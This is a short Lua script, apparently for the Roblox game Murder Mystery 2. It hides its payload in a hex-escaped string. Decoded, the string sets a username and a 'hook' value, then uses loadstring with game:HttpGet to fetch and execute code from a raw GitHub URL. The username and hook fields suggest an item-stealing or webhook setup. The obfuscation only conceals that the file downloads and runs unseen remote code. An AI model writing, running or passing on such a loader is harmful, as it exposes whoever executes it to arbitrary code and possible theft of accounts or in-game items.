
local hex = "\x0a\x55\x73\x65\x72\x6e\x61\x6d\x65\x20\x3d\x20\x22\x68\x68\x64\x64\x22\x0a\x53\x4c\x48\x6f\x6f\x6b\x20\x3d\x20\x5b\x5b\x6a\x68\x66\x5d\x5d\x0a\x0a\x6c\x6f\x61\x64\x73\x74\x72\x69\x6e\x67\x28\x67\x61\x6d\x65\x3a\x48\x74\x74\x70\x47\x65\x74\x28\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x53\x63\x72\x69\x70\x74\x53\x74\x2f\x4d\x4d\x32\x2f\x6d\x61\x69\x6e\x2f\x59\x41\x52\x48\x4d\x22\x29\x29\x28\x29\x0a"
local str = hex:gsub("\\x(%x%x)", function(c) return string.char(tonumber(c, 16)) end)
loadstring(str)()
